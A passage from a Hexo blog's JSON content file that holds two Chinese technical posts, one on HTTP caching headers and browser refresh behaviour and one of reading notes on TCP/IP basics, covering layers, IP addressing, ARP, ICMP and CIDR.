的值都没变化，则说明你当前请求是命中了代理服务器的缓存。</p>\n<p>Age表示资源在代理服务器中存在的时间<em>（秒）</em>，如文件被修改或替换，Age会重新由0开始累计。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">静态资源Age + 静态资源Date = 原服务端Date</span><br></pre></td></tr></table></figure>\n<p>不过这条规则也不一定准确，特别是当原服务器经常修改系统时间的情况下。</p>\n<h2 id=\"二、缓存判断流程\"><a href=\"#二、缓存判断流程\" class=\"headerlink\" title=\"二、缓存判断流程\"></a>二、缓存判断流程</h2><p>参考<a href=\"https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn\" target=\"_blank\" rel=\"noopener\">Google Developer HTTP缓存</a></p>\n<p><img src=\"http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/28130284.jpg\" alt=\"缓存决策树\"></p>\n<p>这个图可以说是设置缓存的参考策略，也可以据此判断浏览器判断是否使用缓存的大概流程：</p>\n<ol>\n<li><p>由Expires、Pragma、max-age等判断缓存是否过期，未过期直接使用缓存，已过期进行下一步</p>\n</li>\n<li><p>发起请求，请求头附带If-None-Match和If-Modified-Since，服务器由If-Modified-Since与其Last-Modified对比，如果不一致直接反回新版本的资源，否则需要再判断If-None-Match和Etag是否一致，如果不一致直接返回新版本资源，否则返回304状态码，浏览器就可以直接使用本地的缓存副本</p>\n</li>\n</ol>\n<p><img src=\"http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/8668139.jpg\" alt=\"浏览器的缓存判断流程\"></p>\n<p>另外需要注意的是，Chrome浏览器中，当缓存未过期直接使用缓存时，在Dev Tools的network选项卡中显示的是200 OK (from cache)。</p>\n<h2 id=\"三、前端设置\"><a href=\"#三、前端设置\" class=\"headerlink\" title=\"三、前端设置\"></a>三、前端设置</h2><h3 id=\"1-HTTP-header字段设置\"><a href=\"#1-HTTP-header字段设置\" class=\"headerlink\" title=\"1. HTTP header字段设置\"></a>1. HTTP header字段设置</h3><p>涉及到前端人员需要设置的HTTP header字段有哪些呢？通过前面按照能否被请求头、响应头支持这一标准进行的分类中，我们知道请求首部字段有：If-Match / If-None-Match、If-Modified-Since / If-Unmodified-Since，这几个值通常是首先服务器发回Etag、Last-Modified，然后浏览器自动加在请求头里面的，所以一般不用前端人员进行设置。<strong>通用首部字段有：Cache-Control、Pragma，也就是说作为前端人员，可以通过对这两个字段进行设置以控制缓存。</strong>（TODO）</p>\n<h3 id=\"2-Meta-http-equiv设置缓存\"><a href=\"#2-Meta-http-equiv设置缓存\" class=\"headerlink\" title=\"2. Meta http-equiv设置缓存\"></a>2. Meta http-equiv设置缓存</h3><p>HTML4中支持在meta标签的http-equiv属性中使用http头部缓存控制字段，包括Expires、Pragma、Cache-Control等。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-cache, no-store, must-revalidate&quot; /&gt;</span><br><span class=\"line\">&lt;meta http-equiv=&quot;Pragma&quot; content=&quot;no-cache&quot; /&gt;</span><br><span class=\"line\">&lt;meta http-equiv=&quot;Expires&quot; content=&quot;0&quot; /&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>The <a href=\"https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv\" target=\"_blank\" rel=\"noopener\">http-equiv</a> attribute can be used in place of the name attribute and has a special significance when documents are retrieved via the Hypertext Transfer Protocol (HTTP). HTTP servers may use the property name specified by the <a href=\"https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv\" target=\"_blank\" rel=\"noopener\">http-equiv</a> attribute to create an <a href=\"https://www.w3.org/TR/html4/references.html#ref-RFC822\" target=\"_blank\" rel=\"noopener\">[RFC822]</a>-style header in the HTTP response. Please see the HTTP specification (<a href=\"https://www.w3.org/TR/html4/references.html#ref-RFC2616\" target=\"_blank\" rel=\"noopener\">[RFC2616]</a>) for details on valid HTTP headers.</p>\n</blockquote>\n<p>参考自<a href=\"https://www.w3.org/TR/html4/struct/global.html#h-7.4.4\" target=\"_blank\" rel=\"noopener\">w3.org | HTML4 | META and HTTP headers</a></p>\n<p>HTML5中已经不再包含这样的用法。参考自<a href=\"https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives\" target=\"_blank\" rel=\"noopener\">w3.org | HTML5 | META Pragma directives</a></p>\n<p>当同时在meta标签中设置了缓存控制字段并在HTTP header中设置了这些字段时，会优先使用HTTP header字段。另外有的代理服务器可能会不认这个设置，为了避免造成冲突和混乱，建议只使用HTTP header设置缓存。另外META http-equiv适用于在file:// 本地文件中使用。</p>\n<blockquote>\n<p><strong><a href=\"https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers\" target=\"_blank\" rel=\"noopener\">HTML meta tags vs HTTP response headers</a></strong></p>\n<p>Important to know is that when a HTML page is served over a HTTP connection, and a header is present in <strong>both</strong> the HTTP response headers and the HTML <code>&lt;meta http-equiv&gt;</code> tags, then the one specified in the HTTP response header will get precedence over the HTML meta tag. The HTML meta tag will only be used when the page is viewed from local disk file system via a <code>file://</code> URL. See also <a href=\"http://www.w3.org/TR/html4/charset.html#h-5.2.2\" target=\"_blank\" rel=\"noopener\">W3 HTML spec chapter 5.2.2</a>. Take care with this when you don’t specify them programmatically, because the webserver can namely include some default values.</p>\n<p>Generally, you’d better just <strong>not</strong> specify the HTML meta tags to avoid confusion by starters, and rely on hard HTTP response headers. Moreover, specifically those <code>&lt;meta http-equiv&gt;</code> tags are <a href=\"http://validator.w3.org/\" target=\"_blank\" rel=\"noopener\"><strong>invalid</strong></a> in HTML5. Only the <code>http-equiv</code> values listed in <a href=\"http://dev.w3.org/html5/spec-preview/the-meta-element.html#attr-meta-http-equiv\" target=\"_blank\" rel=\"noopener\">HTML5 specification</a> are allowed.</p>\n</blockquote>\n<h3 id=\"3-给静态资源加版本号Revved-Resource\"><a href=\"#3-给静态资源加版本号Revved-Resource\" class=\"headerlink\" title=\"3.给静态资源加版本号Revved Resource\"></a>3.给静态资源加版本号Revved Resource</h3><p>更多地利用缓存资源，可以提高网站的性能和相应速度。为了优化缓存，过期时间设置得尽量长是一种很好的策略。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些js/css文件，当它们变动时需要尽快更新线上资源。</p>\n<p>web开发者发明了一种 Steve Sounders 称作加速（译者注：revving）的技术<a href=\"https://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/\" target=\"_blank\" rel=\"noopener\">[1]</a> 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。</p>\n<h2 id=\"四、设置规则\"><a href=\"#四、设置规则\" class=\"headerlink\" title=\"四、设置规则\"></a>四、设置规则</h2><ol>\n<li><p>为基本不会变动的资源设置非常长的过期时间，例如Image、Fonts、jQuery库文件等，以年为单位，例如淘宝网的logo图片设置了一年的max-age值</p>\n</li>\n<li><p>为定时变动的资源设置中等过期时间，例如CSS文件、JS文件，以版本更替的时间间隔为参考进行设置，如果在过期时间之前需要发新版本，为避免用户仍访问本地副本（因为本地副本还未过期），可使用加版本号的做法</p>\n</li>\n<li><p>HTML文档不使用缓存或谨慎设定过期时间，因为其他资源（图片、CSS、JavaScript 等）的请求都来自一个单一的HTML 文档，如果被缓存了，那么页面中包含的资源的文件名等信息都会一并被缓存，导致对它的更新难以确保立即对用户生效。（TODO）</p>\n</li>\n</ol>\n<p>一个网站，说白了就是HTML+JS+CSS+fonts+img 这几类文件，我们可以针对这几类文件做一些缓存层级</p>\n<table>\n<thead>\n<tr>\n<th>文件</th>\n<th>缓存层级</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>HTML</td>\n<td>Cache-Control: no-cache,must-revalidate</td>\n</tr>\n<tr>\n<td>JS</td>\n<td>Cache-Control:private,max-age=86400</td>\n</tr>\n<tr>\n<td>CSS</td>\n<td>Cache-Control:max-age=2629000</td>\n</tr>\n<tr>\n<td>img\\fonts</td>\n<td>Cache-Control:max-age=2629000</td>\n</tr>\n</tbody>\n</table>\n<p>上面只是一个简单的设置，要知道HTML是一定不能缓存的(大部分网页)。 缓存设置时间应该在你版本稳定之后设置，否则会得不偿失。 另外设置Cache-Control还可以配合ETag或者Last-Modified进行补偿验证，如果后面文件变化也可以及时反映出来。</p>\n<h2 id=\"五、用户刷新-访问行为\"><a href=\"#五、用户刷新-访问行为\" class=\"headerlink\" title=\"五、用户刷新/访问行为\"></a>五、用户刷新/访问行为</h2><p>我们可以把刷新/访问界面的手段分成以下几类：</p>\n<ul>\n<li><p><strong>在URI输入栏中输入然后回车 / 通过书签访问 / 通过浏览器前进后退按钮 / 通过页面中的a标签链接进行访问</strong></p>\n<p>返回<code>200 OK (from cache)</code>，浏览器发现该资源已经缓存了而且没有过期（通过Expires头部或者Cache-Control头部），没有跟服务器确认，而是直接使用了浏览器缓存的内容。</p>\n</li>\n<li><p><strong>F5 / 点击工具栏中的刷新按钮 / 右键菜单重新加载</strong></p>\n<p>F5会让浏览器<strong>无论如何都发一个HTTP Request给Server</strong>，即使先前的响应中有Expires头部。并且浏览器会在Request header中添加这样的字段:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">If-Modified-Since: Fri, 15 Jul 2016 04:11:51 GMT</span><br></pre></td></tr></table></figure>\n<p>其中Cache-Control是Chrome强制加上的，而If-Modified-Since是因为获取该资源的时候包含了Last-Modified头部，浏览器会使用If-Modified-Since头部信息重新发送该时间以确认资源是否需要重新发送。 实际上Server没有修改这个文件，所以返回了一个<code>304(Not Modified)</code></p>\n</li>\n<li><p><strong>Ctl+F5</strong></p>\n<p>Ctrl+F5要的是<strong>彻底的从Server拿一份新的资源过来</strong>，所以不光要发送HTTP request给Server，而且这个请求里面连If-Modified-Since/If-None-Match都没有，这样就逼着Server不能返回304，而是把整个资源原原本本地返回一份</p>\n<p>实际上，为了保证拿到的是从Server上最新的，Ctrl+F5不只是去掉了If-Modified-Since/If-None-Match，还需要添加一些HTTP Headers。按照HTTP/1.1协议，Cache不光只是存在Browser终端，从Browser到Server之间的中间节点(比如Proxy)也可能扮演Cache的作用，为了防止获得的只是这些中间节点的Cache，需要告诉他们，别用自己的Cache敷衍我，往Upstream的节点要一个最新的copy吧。<br>在Chrome 51 中会包含两个头部信息， 作用就是让中间的Cache对这个请求失效，这样返回的绝对是新鲜的资源。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Pragma: no-cache</span><br></pre></td></tr></table></figure>\n<p>参考自<a href=\"http://imweb.io/topic/5795dcb6fb312541492eda8c\" target=\"_blank\" rel=\"noopener\">HTTP缓存控制小结</a></p>\n</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ol>\n<li><a href=\"https://zhuanlan.zhihu.com/p/24467558\" target=\"_blank\" rel=\"noopener\">【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法</a></li>\n<li><a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html\" target=\"_blank\" rel=\"noopener\">rfc2616 14.Header Field Definitions</a></li>\n<li><a href=\"http://www.cnblogs.com/vajoy/p/5341664.html\" target=\"_blank\" rel=\"noopener\">浅谈浏览器http的缓存机制-Vajoy</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\" target=\"_blank\" rel=\"noopener\">MDN | HTTP缓存</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers\" target=\"_blank\" rel=\"noopener\">MDN | HTTP headers</a></li>\n<li><a href=\"https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn\" target=\"_blank\" rel=\"noopener\">Google Developer HTTP缓存</a></li>\n<li><a href=\"https://www.renfei.org/blog/http-caching.html\" target=\"_blank\" rel=\"noopener\">网站优化：浏览器缓存控制简介及配置策略</a></li>\n<li><a href=\"http://imweb.io/topic/5795dcb6fb312541492eda8c\" target=\"_blank\" rel=\"noopener\">HTTP缓存控制小结–总结了刷新页面的不同方式的影响</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000004486640\" target=\"_blank\" rel=\"noopener\">浏览器的缓存</a></li>\n<li><a href=\"https://www.w3.org/TR/html4/struct/global.html#h-7.4.4\" target=\"_blank\" rel=\"noopener\">w3.org | HTML4 | META and HTTP headers</a></li>\n<li><a href=\"https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives\" target=\"_blank\" rel=\"noopener\">w3.org | HTML5 | META Pragma directives</a></li>\n<li><a href=\"https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers\" target=\"_blank\" rel=\"noopener\">HTML meta tags vs HTTP response headers</a></li>\n<li><a href=\"http://imweb.io/topic/5795dcb6fb312541492eda8c\" target=\"_blank\" rel=\"noopener\">HTTP缓存控制小结</a></li>\n</ol>\n<p><strong>技术博客为了总结整理知识和帮助别人</strong></p>"},{"title":"TCP/IP入门经典_总结","date":"2018-04-02T13:00:00.000Z","toc":true,"comments":1,"_content":"本文是对《TCP/IP入门经典》前五章的梳理总结或者说一个读书笔记，主要说明了TCP/IP协议的基础知识、四层模型的结构、每层模型用到的协议，协议的主要内容等。由于篇幅关系，只写到了四层协议中的网络访问层和网际层，计划后续补全。阅读本文可以让你对于互联网的运行基础建立一个大概的印象，为深入了解TCP/IP协议打下基础。\n\n<!-- More -->\n\n> by MaryTien from [http://luckymona.github.io](http://luckymona.github.io)\n\n## 一、什么是TCP/IP##\n\n### 1.基础知识 ###\n\n网络是计算机或类似计算机的设备之间通过常用传输介质进行通信的结合。网络协议就是一套通用功能规则，用来帮助定义复杂数据传输的过程。TCP/IP及其相关协议定义了完整的网络通信过程，被称为协议簇。\n\n- TCP/IP标准定义了TCP/IP网络的通信规则；\n- TCP/IP实现是一个软件组件，计算机通过它参与到TCP/IP网络中。\n- TCP/IP标准的目的是确保所有厂商提供的TCP/IP实现都能很好地兼容。\n\nTCP/IP起源于美国国防部的ARPAnet网络，成为Internet比较成功的一部分，并提供两个重要特性：\n\n- 端点验证：两台实际通信的计算机都称为端点，位于信息链的末端，负责确认和验证传输，没有监视通信的中心模式\n- 动态路由选择\n\n个人计算机接入Internet的方法：\n\n- 使用modem拨号系统，它是通过一条电话线来提供网络连接的\n\n- 与办公室其他计算机组成局域网，使用专门的网关进行协议转换，接入Internet\n\nTCP/IP的特性，也是TCP/IP的核心：\n\n- 逻辑编址\n\n- 路由选择\n\n- 名称解析\n\n- 错误控制和流量控制\n\n- 应用支持\n\n缩写：\n\n- LAN：Local Area Network局域网\n- TCP：Transmission Control Protocal 传输控制协议\n- IP：Internet Protocal 网络协议\n\n### 2. 逻辑编址 ###\n\n术语：\n\n- 以太网：Ethernet 一种基带局域网规范，当今最通用的局域网标准\n- VPN：Virtual Private Network  虚拟专用网络\n- NAT：Network Address Transition网络地址转换\n\n网络适配器即网卡，出厂时都分配有一个物理地址，称为MAC地址，在LAN中，低层的与硬件相关的协议使用MAC地址在物理网络中传输数据。网卡监听LAN中的每一个传输，以确定消息是否发送到它的物理地址。\n\n网管使用如路由器的设备将网络分段，以减少网络拥堵。在路由式网络中，管理员需要一种细分网络到更小的子网的方法，TCP/IP通过逻辑编址提供了子网化能力，逻辑地址是一个通过网络软件来配置的地址，称为IP地址。\n\nIP地址包括：\n\n- 网络ID：识别网络\n\n- 子网ID：识别网络中的子网\n\n- 主机ID：识别子网中计算机的主机\n\nTCP/IP中使用ARP和RARP作IP地址与MAC地址的转换。\n\n- ARP：Address Resolution Protocal地址解析协议\n\n- RARP：Reverse-  逆向地址解析协议\n\n### 3.路由选择 ###\n\n路由器能够读取IP地址，将一个局域网连接到一个大型的网络上，可以减少网络拥塞。\n\nTCP/IP包括了定义路由器如何找到网络路径的协议。\n\n网桥、交换机和智能HUB等设备也都可以减少网络拥塞，但使用MAC地址而不是IP，因此不能执行复杂路由功能。\n\n### 4.名称解析\n\nTCP/IP提供IP的另一种结构，为域名系统，DNS Domain Name System，域名到IP的映射称为名称解析。域名服务器是一个专用计算机，存储域名和IP的映射表。\n\n### 5.错误控制和流量控制\n\nTCP/IP提供了确保数据在网络中可靠传送的特性。传输层定义了许多错误控制、流量控制和确认功能。\n\n### 6.应用支持\n\n一台计算机上可以运行多种网络程序，协议软件必须提供方法来判断接收到的数据包属于哪个程序。在TCP/IP中国年，这个通过系统的逻辑通道实现从网络到应用程序的接口被称为端口。可以把端口想象为计算机中的逻辑管道。\n\n### 7.标准组织和RFC\n\n- ICNN：互联网名称与数字地址分配机构\n- RFC：Request For Comments 请求评议，一系列以编号排定的文件，收集有关互联网的相关信息，被称为网络知识圣经。www.rfc-editor.org可以找到RFC\n\n## 二、TCP/IP的工作方式\n\n### 1.TCP/IP模型\n\n术语：\n\n- 网间：internetwork 指的是多个局域网互相连接形成的较大的网络\n\nTCP/IP协议系统划分为不同层次的组件，分别实现特定的功能，称为TCP/IP模型：\n\n- 应用层：网络服务 + 应用编程接口 + 网络应用程序和功能\n\n- 传输层：TCP+UDP 提供流量控制、错误控制和确认服务，充当应用程序的接口\n\n- 网际层：IP+ARP  实现物理地址与逻辑地址的转换，提供路由功能，支持网间的数据传递；\n\n- 网络访问层：提供与物理网络连接的接口\n\n### 2.OSI模型\n\n网络协议体系的标准的七层模型，称为OSI模型：开放互联模型，与TCP/IP是相互独立的，经常被作为一种通用框架来理解各种协议系统。\n\n在重要的传输层和网际层，OSI和TCP/IP模型是最相似的，这些层包含的组件最能体现网络协议之间的区别，所以很多协议根据其传输层和网络层进行命名。TCP/IP名称就来自于TCP（传输层协议）和IP（一个网际层协议）。\n\n应用层、表示层、会话层\t===》\t应用层\n\n传输层\t\t\t\t\t===》\t传输层\n\n网络层\t\t\t\t\t===》\t网际层\n\n数据链路层、物理层\t\t===》\t网络访问层\n\n### 3.数据包\n\n在数据发送过程中，其流程从TCP/IP四层模型堆栈的从上到下，每一层都把相关的信息（称为‘报头’）捆绑到实际数据上，包含包头信息和数据的数据包作为下一层的数据，再次被添加报头信息和重新打包。当数据到达目的计算机时，使用相关的过程一层层解包并最终使用其中的信息。\n\n前一个过程像俄罗斯套娃，在物理网络中如以太网，数据在网络访问层杯分解为较小的单元，像把套娃分解为碎片，把这些碎片封装到很小的娃娃里，再把他们以1和0的模式表示。接收端收到这些1和0之后，重新组合为小娃娃，再重建整个套娃。\n\n数据包在每一层的形式和名称：\n\n- **应用层**的数据包称为**消息**\n\n- **传输层**封装消息生成新的数据包，如果来自于传输层的TCP协议，就称为**分段**；如果来自UDP协议，就称为**数据报**\n\n- **网际层**封装传输层的分段生成的数据包，也称为**数据报**\n\n- **网络访问层**封装数据报生成的新数据包，称为**帧**，帧被访问层里的最低子层转化为**比特流**\n\nTCP与UDP的区别：\n\n- TCP是面向连接的协议，与无连接协议相比，能提供更复杂的流量控制和错误控制。TCP能确保数据的发送质量，比UDP更可靠，但比UDP的速度慢，因为要额外进行错误检测和流量控制。\n- UDP是个无连接的协议，比TCP快，但是不可靠，它把错误控制的责任推给了应用。\n\n## 三、TCP/IP模型之网络访问层\n\n网络访问层主要管理着对网络硬件的访问。它定义了与网络硬件交互和访问传输介质的过程。是TCP/IP协议栈中变化最多、最复杂的一层。一定要牢记：逻辑IP地址只存在于软件之中。\n\n**网络体系**：包含对物理网络的定义，及该物理网络上定义的通信规范，规范包含以下方面：访问方法、数据帧格式、布线类型、布线规则\n\n网络访问层包含如下网络体系：\n\n- IEEE802.3  \t以太网\t\t大多数办公室和家庭使用的基于线缆的局域网\n  - IEEE802.11无线网络\t\t即WIFI\n    - IEEE802.16WiMAX\t用于移动通信长距离无线网络技术\n      - 点到点协议PPP\tModem通过电话线连接的技术\n\n### 3.1以太网\n\n以太网是目前使用最广泛的局域网技术，在典型以太网上，所有计算机共享同个传输介质。使用CSMA/CD的方法（载波侦听多路访问／冲突检测），来判断计算机何时可以把数据发送到访问介质。\n\n**CSMA/CD**可以比喻为一个有很多人的房间。若有人想讲话，首先要确认目前是否有人在讲话（这就是**载波侦听**）。若两人同时开始讲话，他们都会发现这个问题，从而停止讲话，等一段时间再开始讲话（这就是**冲突检测**）。\n\n传统以太网在中低负载情况下运行良好，大负载下由于冲突增多而影响性能，现代以太网中会使用**网络交换机**对流量进行管理，以减少冲突。早期以太网中，所有计算机通过一条同轴线缆连接（就像电路串联），现代以太网中，每台计算机都连接到中央网络设备如**交换机**中，再由交换机接入Internet（就像电路串联）。\n\n以太帧的传输过程：\n\n网际层的数据==》{ 进入网络访问层：把数据分成块—>数据块打包成帧—>OSI模型物理层的底层组件把帧转换成比特流—>传输介质  }==》介质传输到别的网卡\n\n以太帧中包含**帧校验序列（FCS）**FCS是校验数据传输的常见方式，发送方计算帧的循环冗余码校验值（**CRC**值），把这个值写到帧里。接收方计算机重新计算CRC，与FCS字段的值进行比较，如果两个值不相同，就表示传输过程中发生了数据丢失或改变，就需要重新传输这一帧。\n\n## 四、TCP/IP模型之网际层\n\n一个网段（如一个以太局域网）上的计算机能够使用网络访问层提供的MAC地址进行通信，网际层提供的协议负责局域网网段之外的传递，**重要的协议包括IP、ARP和ICMP**（Internet Control Message Protocal 即Internet控制报文协议）。\n\n### 4.1寻址与发送\n\n在网络访问层，像以太网网卡对于上层协议一点不了解的，它只监听是否受到了数据帧，发现其中目标地址与自己物理地址相符的帧，并把这个帧传给上层协议栈，这种使用物理寻址的方式适合单个局域网网段。但在路由式网络中，不能利用物理地址实现数据传输，因此TCP/IP隐藏了物理地址，以一种逻辑化、层次化的寻址方案对网络进行组织。这种逻辑寻址方案由网际层的IP协议维护，因而逻辑地址被称为IP地址。\n\n在一个路由式网络中，TCP/IP软件使用如下策略在网络上发送数据：\n\n1. 如果目的地址与源地址在同个网段，源计算机直接把数据包发给目的计算机。IP地址被解析为物理地址，数据被直接发送到目的网卡\n\n2. 如果不在同个网段，就执行下列过程：\n\n   a. 直接将数据报发到网关，网关是局域网中的一个设备（网关也算是一个路由器），能把数据报转发到其他网段。网关地址被ARP解析为物理地址，数据被发送到网关的网络适配器。\n\n   b. 数据报通过网关被路由到较高级别的网段，再次重复上述过程，如果目的地址在这个新网段里，数据就被发送到目的，否则数据报就被发送到 另一个网关。\n\n   c. 数据报经过一系列网关被转发到目的网段。目的IP地址被ARP解析为物理地址，数据被发送到目的网络适配器。\n\n### 4.2网际协议（IP）\n\nIP协议提供了一种分层的、与硬件无关的寻址系统，TCP/IP网络上的每个网络适配器都有一个唯一的IP地址。通常计算机只有一个IP地址，是因为只有一个网卡，但作为路由器或代理服务器的计算机必须有多个网卡，因此有多个IP地址。\n\nIP地址包括两个部分：\n\n- 网络ID：像邮政编码，表明大致区域\n- 主机ID：像街道地址，表明区域内的准确位置\n\n1. IP报头字段\n\n   每个IP数据报都以一个IP报头开始，源计算机的TCP/IP软件构造这个IP报头，目的计算机的TCP/IP软件利用IP报头中封装的信息处理数据。\n\n   IP报头的最小长度是20字节，报头长度必须是32位字的整数倍，包含一系列字节，**跳数**代表数据报到达目的地之前必须经过的路由器的数量。\n\n2. IP寻址\n\n   IP地址是一个32位的地址，分为4个8位段，常用**点分十进制**来简化32位二进制地址。\n\n   **IP地址分类：**\n\n   A类地址：前8位表示网络ID，后24位表示主机ID，0～127\n\n   B类地址：前16位表示网络ID，后16位表示主机ID，128～191\n\n   C类地址：前24位表示网络ID，后8位表示主机ID，192～223\n\n   D类地址：用于多播，即把一个消息发送到网络的子网\n\n   E类地址：实验性质的，一般不用于生产环境，240～247\n\n   **子网：**\n\n   划分子网的实质是借用主机ID中的一些位，把网络划分为更小的次级网络。\n\n3. 特殊的IP地址\n\n   - 全0的主机ID表示网络本身，如129.152.0.0是指网络ID为129.152的B类网络。\n\n   - 全1的主机ID表示广播，即向网络中全部主机发送消息，如129.152.255.255就是网络ID为129.152的B类网络的广播地址。\n\n   - 地址255.255.255.255也可以用于网络上的广播。\n\n   - 以十进制127开头的地址是还回地址，目的地址为还回地址的消息是由本地TCP/IP软件发送的，目的在于测试TCP/IP软件是否工作正常，如Ping功能，通常使用的还回地址是127.0.0.1\n\n### 4.3 ARP（地址解析协议）与RARP（逆向-）\n\n网段上每台主机在内存中都保存着一个ARP表或称为ARP缓存的表格，其中包含着网段上其他主机的IP地址与物理地址的对应关系。当主机需要向网段上的其他主机发送数据时，他会查看ARP缓存来获得目的物理地址。ARP缓存是动态变化的，如果目的IP在缓存中找不到，主机就会发送一个名为**ARP请求帧**的广播。网段上的其他主机接收到这个ARP请求，拥有这个目的IP地址的主机会向发出请求的主机发送自己的物理地址，这个目的IP与物理地址的对应关系会添加到请求主机的ARP缓存里面。\n\nRARP常与BOOTP协议共同使用来启动无盘工作站。\n\n**BOOTP**：用来远程启动计算机或其它网络设备的协议。\n\n### 4.4 ICMP （Internet控制消息协议）\n\n发送到远程计算机的数据通常会经过多个路由器，这些路由器在把数据传输到最终目的地的过程中可能会发生多种问题，路由器利用ICMP消息把问题通知给源IP，ICMP还有其他调试和排错的功能。ICMP是用于诊断和测试的协议。常见ICMP消息：\n\n- Echo Request（回显请求）和Echo Reply（回显应答）\n\n  ICMP经常被用于测试，比如测试连接的ping命令实际上就是在使用ICMP。ping向某个IP地址发送一个数据报，并且要求目的计算机在响应中返回所发送的数据。ping实际使用的命令是ICMP的Echo Request和Echo Reply\n\n- Source Quench（源抑制）\n\n- Destination Unreachable（目的不可到达）\n\n- Time Exceeded（超时）\n\n- Fragmentation Needed（需要分段）\n\n## 五、子网划分和CIDR\n\n子网划分让数据报能够到达面向较小地址空间的路由器，最早源于地址分类系统。CIDR不需要关心地址类别。\n\n### 5.1网络划分\n\n像A类网络可以容纳超过1600万台主机，此时把网络划分为独立的物理网络能够增加网络的整体性能。子网划分就是在网络ID之下提供了第2层逻辑组织，路由器能把数据报发送给网络里的某个子网地址（一般对应于一个网段），当数据报到达子网之后，就会被ARB解析为物理地址。\n\nTCP/IP规定借用主机ID的一些位来形成子网地址，用**子网掩码**来指明地址中的多少位用于子网ID，保留多少位作为实际的主机ID。子网掩码也是32位的二进制值，每一位代表IP地址的一个位，**1表示IP地址中术语网络ID或子网ID的位，0表示属于主机ID的位**。可以把子网掩码看作阅读IP地址的映射。\n\n网管通常把子网掩码作为TCP/IP配置的参数分配给每个主机。一个子网内的所有主机应该具有相同的子网ID和子网掩码。\n\n### 5.2无类别域间路由CIDR\n\nIPv4即将耗尽，C类地址还有剩余，但地址空间比较小。使用一个CIDR前缀的值制定地址中作为网络ID的位数，这个前缀也被称为变长子网掩码VLSM，如在CIDR地址205.123.196183/25中，/25表示地址中25位用于网络ID，相应的子网掩码就是255.255.255.128。\n\nCIDR不仅可以对网络划分子网，还让ISP（Internet Service Provider）或管理员能够把多个连续C类网络聚合成一个实体。此时CIDR前缀发挥了**超网掩码**的作用。如ISP可以分配204.21.128.0～204.21.255.255的全部C类地址，这些网络地址的前17位是一样的，因此超网掩码是255.255.128.0。\n\n支持CIDR的路由表可以只使用一个CIDR条目204.21.128.0/17来引用这段地址的全部范围。该条目适用于与地址204.21.128.0的前17位匹配的所有地址。\n\n  \n\n\n\n","source":"_posts/TCP-IP.md","raw":"---\ntitle: TCP/IP入门经典_总结\ndate: 2018-04-02 21:00:00\ncategories: HTTP\ntags: [HTTP] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n本文是对《TCP/IP入门经典》前五章的梳理总结或者说一个读书笔记，主要说明了TCP/IP协议的基础知识、四层模型的结构、每层模型用到的协议，协议的主要内容等。由于篇幅关系，只写到了四层协议中的网络访问层和网际层，计划后续补全。阅读本文可以让你对于互联网的运行基础建立一个大概的印象，为深入了解TCP/IP协议打下基础。\n\n<!-- More -->\n\n> by MaryTien from [http://luckymona.github.io](http://luckymona.github.io)\n\n## 一、什么是TCP/IP##\n\n### 1.基础知识 ###\n\n网络是计算机或类似计算机的设备之间通过常用传输介质进行通信的结合。网络协议就是一套通用功能规则，用来帮助定义复杂数据传输的过程。TCP/IP及其相关协议定义了完整的网络通信过程，被称为协议簇。\n\n- TCP/IP标准定义了TCP/IP网络的通信规则；\n- TCP/IP实现是一个软件组件，计算机通过它参与到TCP/IP网络中。\n- TCP/IP标准的目的是确保所有厂商提供的TCP/IP实现都能很好地兼容。\n\nTCP/IP起源于美国国防部的ARPAnet网络，成为Internet比较成功的一部分，并提供两个重要特性：\n\n- 端点验证：两台实际通信的计算机都称为端点，位于信息链的末端，负责确认和验证传输，没有监视通信的中心模式\n- 动态路由选择\n\n个人计算机接入Internet的方法：\n\n- 使用modem拨号系统，它是通过一条电话线来提供网络连接的\n\n- 